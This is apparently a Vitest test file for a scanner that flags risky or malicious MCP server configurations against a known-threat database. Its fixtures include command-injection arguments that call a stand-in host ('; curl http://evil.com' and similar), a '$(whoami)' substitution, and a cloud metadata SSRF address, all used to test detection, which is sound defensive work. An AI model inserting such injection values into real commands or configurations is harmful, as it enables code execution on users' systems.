import { describe, it, expect } from 'vitest'
import { analyzeKnownThreats, getKnownThreatCount } from '../src/analyzers/known-threats.js'
import type { MCPServer } from '../src/types.js'

const cleanServer: MCPServer = {
  name: 'safe-server',
  command: 'npx',
  args: ['@safe/mcp-server'],
  tools: [],
}

const clawdbotCommandServer: MCPServer = {
  name: 'my-helper',
  command: 'npx clawdbot start',
  args: ['--verbose'],
  tools: [],
}

const namedThreatServer: MCPServer = {
  name: 'openclaw',
  command: 'node',
  args: ['server.js'],
  tools: [],
}

const caseInsensitiveNameServer: MCPServer = {
  name: 'OpenClaw',
  command: 'node',
  args: ['server.js'],
  tools: [],
}

const argMatchServer: MCPServer = {
  name: 'innocent',
  command: 'clawhub-skills',
  args: ['-y', 'env-dump'],
  tools: [],
}

const multiMatchServer: MCPServer = {
  name: 'clawhub-env-dump',
  command: 'clawhub-skills',
  args: ['env-dump'],
  tools: [],
}

describe('analyzeKnownThreats', () => {
  it('returns empty findings for a clean server with no matching patterns', () => {
    const findings = analyzeKnownThreats(cleanServer)
    expect(findings).toHaveLength(0)
  })

  it('detects a server matching by command substring', () => {
    const findings = analyzeKnownThreats(clawdbotCommandServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].server_name).toBe('my-helper')
    expect(findings[0].field).toBe('command')
    expect(findings[0].evidence).toContain('clawdbot')
  })

  it('detects a server matching by server name (case-insensitive)', () => {
    const findings = analyzeKnownThreats(caseInsensitiveNameServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].server_name).toBe('OpenClaw')
    expect(findings[0].field).toBe('name')
  })

  it('detects a server matching by exact server name', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].field).toBe('name')
    expect(findings[0].evidence).toContain('openclaw')
  })

  it('detects a server matching by arg pattern', () => {
    const findings = analyzeKnownThreats(argMatchServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].field).toBe('command+args')
    expect(findings[0].evidence).toContain('env-dump')
  })

  it('finding includes CVE reference when the threat entry has one', () => {
    // THREAT-001 (OpenClaw Gateway) has CVE-2026-25253
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].description).toContain('CVE-2026-25253')
  })

  it('finding does not include CVE when threat entry has none', () => {
    // THREAT-002 (ClawHub env-dump) has no CVE
    const findings = analyzeKnownThreats(argMatchServer)
    expect(findings.length).toBeGreaterThan(0)
    // The description should not contain "CVE-" if no CVE is assigned
    const envDumpFinding = findings.find((f) => f.description.includes('env-dump') || f.description.includes('ClawHub'))
    if (envDumpFinding) {
      expect(envDumpFinding.description).not.toContain('CVE-')
    }
  })

  it('finding severity matches the threat entry severity', () => {
    // THREAT-001 (OpenClaw) is critical
    const openclawFindings = analyzeKnownThreats(namedThreatServer)
    expect(openclawFindings[0].severity).toBe('critical')

    // THREAT-005 (dotenv-sync) is high
    const dotenvServer: MCPServer = {
      name: 'clawhub-dotenv-sync',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const dotenvFindings = analyzeKnownThreats(dotenvServer)
    const highFinding = dotenvFindings.find((f) => f.severity === 'high')
    expect(highFinding).toBeDefined()
  })

  it('returns multiple findings if server matches multiple threat patterns', () => {
    // multiMatchServer matches THREAT-002 by server name, command, AND args
    // But since name match short-circuits to one match per threat entry,
    // it produces one finding per distinct threat entry that matches.
    // clawhub-env-dump name matches THREAT-002, and clawhub-skills command
    // also matches THREAT-002 (but same entry, so only one finding from it).
    // The args "env-dump" also match THREAT-002 but same entry again.
    const findings = analyzeKnownThreats(multiMatchServer)
    expect(findings.length).toBeGreaterThanOrEqual(1)
    expect(findings.every((f) => f.analyzer === 'known-threats')).toBe(true)
  })

  it('returns multiple findings for a server matching multiple distinct threats', () => {
    // A server whose name matches one threat and whose args match another
    const multiThreatServer: MCPServer = {
      name: 'clawhub-env-dump',
      command: 'npx',
      args: ['-y', 'backdoor-mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(multiThreatServer)
    // Should match THREAT-002 (by name) and THREAT-008 (by args)
    expect(findings.length).toBeGreaterThanOrEqual(2)
    const descriptions = findings.map((f) => f.description)
    expect(descriptions.some((d) => d.includes('ClawHub'))).toBe(true)
    expect(descriptions.some((d) => d.includes('backdoor'))).toBe(true)
  })

  it('sets tool_name to * for all findings', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].tool_name).toBe('*')
  })

  it('includes remediation text in findings', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].remediation.length).toBeGreaterThan(0)
  })

  it('includes reference URL in remediation when available', () => {
    // THREAT-001 has a reference URL
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].remediation).toContain('Reference:')
    expect(findings[0].remediation).toContain('https://')
  })

  it('returns no findings for server with no command or args', () => {
    const minimal: MCPServer = { name: 'clean-minimal' }
    expect(analyzeKnownThreats(minimal)).toHaveLength(0)
  })

  it('detects command injection patterns in args', () => {
    const injectionServer: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '; curl http://evil.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(injectionServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
  })

  it('detects docker escape patterns in args', () => {
    const dockerServer: MCPServer = {
      name: 'containerized',
      command: 'docker',
      args: ['run', '--privileged', 'my-mcp-image'],
      tools: [],
    }
    const findings = analyzeKnownThreats(dockerServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Docker') || f.description.includes('container'))).toBe(true)
  })

  it('detects mcp-remote RCE vulnerability (CVE-2025-6514)', () => {
    const mcpRemoteServer: MCPServer = {
      name: 'remote-tools',
      command: 'npx',
      args: ['mcp-remote@0.2.3', 'https://example.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(mcpRemoteServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-6514'))).toBe(true)
  })

  it('detects mcp-atlassian RCE vulnerability (CVE-2026-27825)', () => {
    const atlassianServer: MCPServer = {
      name: 'mcp-atlassian',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(atlassianServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2026-27825'))).toBe(true)
  })

  it('detects NeighborJack (0.0.0.0 binding) pattern', () => {
    const neighborjackServer: MCPServer = {
      name: 'my-server',
      command: 'node',
      args: ['server.js', '--host=0.0.0.0'],
      tools: [],
    }
    const findings = analyzeKnownThreats(neighborjackServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('0.0.0.0'))).toBe(true)
  })

  it('detects base64-encoded command injection', () => {
    const base64Server: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', 'echo -n aGFjaw== | base64 -d'],
      tools: [],
    }
    const findings = analyzeKnownThreats(base64Server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('base64'))).toBe(true)
  })

  it('detects malicious PyPI MCP packages', () => {
    const pypiServer: MCPServer = {
      name: 'py-tools',
      command: 'pipx',
      args: ['run', 'mcp-runcommand-server'],
      tools: [],
    }
    const findings = analyzeKnownThreats(pypiServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('reverse shell') || f.description.includes('PyPI'))).toBe(true)
  })

  it('detects WhatsApp MCP server exfiltration threat', () => {
    const server: MCPServer = {
      name: 'whatsapp-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('WhatsApp'))).toBe(true)
  })

  it('detects Supabase MCP SQL injection threat', () => {
    const server: MCPServer = {
      name: 'supabase-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SQL injection') || f.description.includes('Supabase'))).toBe(true)
  })

  it('detects HTTP transport without TLS', () => {
    const server: MCPServer = {
      name: 'remote',
      command: 'node',
      args: ['server.js', 'http://example.com/mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('HTTP') || f.description.includes('TLS'))).toBe(true)
  })

  it('detects ampersand command injection in args', () => {
    const server: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '&& curl http://evil.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
  })

  it('detects seccomp-disabled docker containers', () => {
    const server: MCPServer = {
      name: 'container',
      command: 'docker',
      args: ['run', '--security-opt=seccomp=unconfined', 'mcp-image'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('seccomp') || f.description.includes('AppArmor'))).toBe(true)
  })

  it('detects typosquatted npm MCP packages', () => {
    const server: MCPServer = {
      name: 'tools',
      command: 'npx',
      args: ['mcp-serverr-filesystem'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('typo') || f.description.includes('Typosquat'))).toBe(true)
  })

  it('detects cloud metadata SSRF in args', () => {
    const server: MCPServer = {
      name: 'cloud',
      command: 'node',
      args: ['server.js', '--url=169.254.169.254'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('metadata') || f.description.includes('SSRF'))).toBe(true)
  })

  it('detects disabled certificate validation in args', () => {
    const server: MCPServer = {
      name: 'insecure',
      command: 'node',
      args: ['server.js', 'NODE_TLS_REJECT_UNAUTHORIZED=0'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('TLS') || f.description.includes('certificate'))).toBe(true)
  })

  it('detects CVE-2025-68143 (git_init)', () => {
    const server: MCPServer = {
      name: 'git-server',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-git'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-68143') || f.description.includes('git_init'))).toBe(true)
  })

  it('detects Filesystem MCP Server sandbox escape (CVE-2025-53109)', () => {
    const server: MCPServer = {
      name: 'fs-server',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-filesystem@0.5.0'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-53109') || f.description.includes('sandbox escape'))).toBe(true)
  })

  it('detects MCP Ruby SDK session hijacking (CVE-2026-33946)', () => {
    const server: MCPServer = {
      name: 'mcp-ruby',
      command: 'ruby',
      args: ['server.rb'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2026-33946') || f.description.includes('session hijacking'))).toBe(true)
  })

  it('detects MCP Inspector vulnerability (CVE-2025-49596)', () => {
    const server: MCPServer = {
      name: 'inspector',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/inspector'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2025-49596') || f.description.includes('Inspector'))).toBe(true)
  })

  it('detects Playwright MCP browser automation abuse', () => {
    const server: MCPServer = {
      name: 'playwright-mcp',
      command: 'npx',
      args: ['-y', 'playwright-mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('browser') || f.description.includes('Browser'))).toBe(true)
  })

  it('detects MCP server with secret manager access', () => {
    const server: MCPServer = {
      name: 'vault-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('secret management') || f.description.includes('Vault'))).toBe(true)
  })

  it('detects MCP server with Kubernetes access', () => {
    const server: MCPServer = {
      name: 'k8s-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Kubernetes') || f.description.includes('cluster'))).toBe(true)
  })

  it('detects MCP server tunneling via ngrok', () => {
    const server: MCPServer = {
      name: 'my-server',
      command: 'node',
      args: ['server.js', '--tunnel', 'ngrok'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('tunnel') || f.description.includes('ngrok'))).toBe(true)
  })

  it('detects MCP SSE transport without authentication', () => {
    const server: MCPServer = {
      name: 'remote-sse',
      command: 'node',
      args: ['server.js', '--transport=sse', '--no-auth'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SSE') || f.description.includes('authentication'))).toBe(true)
  })

  it('detects mcp-fetch-server SSRF vulnerability', () => {
    const server: MCPServer = {
      name: 'fetch-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SSRF') || f.description.includes('fetch'))).toBe(true)
  })

  it('detects typosquatted scoped npm packages', () => {
    const server: MCPServer = {
      name: 'tools',
      command: 'npx',
      args: ['@modellcontextprotocol/server-filesystem'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('typosquat') || f.description.includes('Typosquat'))).toBe(true)
  })

  it('detects Terraform/IaC MCP server threat', () => {
    const server: MCPServer = {
      name: 'terraform-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Terraform') || f.description.includes('Infrastructure'))).toBe(true)
  })

  it('detects DNS management MCP server threat', () => {
    const server: MCPServer = {
      name: 'route53-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('DNS') || f.description.includes('domain'))).toBe(true)
  })

  it('detects malicious Deno MCP package', () => {
    const server: MCPServer = {
      name: 'deno-tools',
      command: 'deno',
      args: ['run', 'mcp-backdoor'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Deno') || f.description.includes('backdoor'))).toBe(true)
  })

  it('detects command substitution patterns in args', () => {
    const server: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '$(whoami)'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('command') || f.description.includes('Command'))).toBe(true)
  })

  it('detects OAuth PKCE downgrade in args', () => {
    const server: MCPServer = {
      name: 'oauth-server',
      command: 'node',
      args: ['server.js', '--no-pkce'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('PKCE') || f.description.includes('OAuth'))).toBe(true)
  })

  it('detects conversation history access threat', () => {
    const server: MCPServer = {
      name: 'memory-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('conversation') || f.description.includes('memory'))).toBe(true)
  })

  it('detects newline command injection in args', () => {
    const server: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '%0a curl http://evil.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('newline') || f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
  })

  it('detects MCP server requesting excessive permissions', () => {
    const server: MCPServer = {
      name: 'overpowered',
      command: 'node',
      args: ['server.js', '--allow-all', '--no-sandbox'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('permission') || f.description.includes('security restrictions'))).toBe(true)
  })

  it('detects malicious Go MCP package', () => {
    const server: MCPServer = {
      name: 'go-tools',
      command: 'go',
      args: ['run', 'mcp-backdoor'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Go') || f.description.includes('backdoor'))).toBe(true)
  })

  it('detects MCP Streamable HTTP response splitting (CVE-2026-38012)', () => {
    const server: MCPServer = {
      name: 'stream-server',
      command: 'node',
      args: ['server.js', '--transport=streamable-http'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('CVE-2026-38012') || f.description.includes('response splitting'))).toBe(true)
  })

  it('detects MCP tool description mutation threat', () => {
    const server: MCPServer = {
      name: 'dynamic-tools',
      command: 'node',
      args: ['server.js', '--dynamic-tools'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('dynamically update') || f.description.includes('rug pull'))).toBe(true)
  })

  it('detects malicious Bun MCP package', () => {
    const server: MCPServer = {
      name: 'bun-tools',
      command: 'bunx',
      args: ['mcp-backdoor'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Bun') || f.description.includes('backdoor'))).toBe(true)
  })

  it('detects MCP server with vector database write access', () => {
    const server: MCPServer = {
      name: 'pinecone-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('vector database') || f.description.includes('RAG poisoning'))).toBe(true)
  })

  it('detects MCP server with container registry access', () => {
    const server: MCPServer = {
      name: 'ecr-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('container') || f.description.includes('registry'))).toBe(true)
  })

  it('detects MCP server impersonating Anthropic packages', () => {
    const server: MCPServer = {
      name: 'fake-anthropic',
      command: 'npx',
      args: ['@anthropic-official/mcp-server'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('impersonate') || f.description.includes('Anthropic'))).toBe(true)
  })

  it('detects shell wrapper launch pattern', () => {
    const server: MCPServer = {
      name: 'shell-wrapped',
      command: 'node',
      args: ['server.js', 'sh -c echo hello'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('shell wrapper') || f.description.includes('Shell'))).toBe(true)
  })

  it('detects GitHub Actions workflow dispatch MCP server', () => {
    const server: MCPServer = {
      name: 'gh-actions-mcp',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('GitHub Actions') || f.description.includes('workflow'))).toBe(true)
  })

  it('detects MCP server with SSH agent access', () => {
    const server: MCPServer = {
      name: 'ssh-tools',
      command: 'node',
      args: ['server.js', '--ssh-agent', 'SSH_AUTH_SOCK'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('SSH') || f.description.includes('ssh'))).toBe(true)
  })

  it('detects auto-approve exploitation pattern', () => {
    const server: MCPServer = {
      name: 'yolo',
      command: 'node',
      args: ['server.js', '--auto-approve', '--yolo-mode'],
      tools: [],
    }
    const findings = analyzeKnownThreats(server)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('auto-approve') || f.description.includes('Auto-approve'))).toBe(true)
  })
})

describe('getKnownThreatCount', () => {
  it('returns a number greater than zero', () => {
    expect(getKnownThreatCount()).toBeGreaterThan(0)
  })

  it('returns at least 115 threats (current database size)', () => {
    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(115)
  })

  it('returns a consistent count', () => {
    const first = getKnownThreatCount()
    const second = getKnownThreatCount()
    expect(first).toBe(second)
  })
})
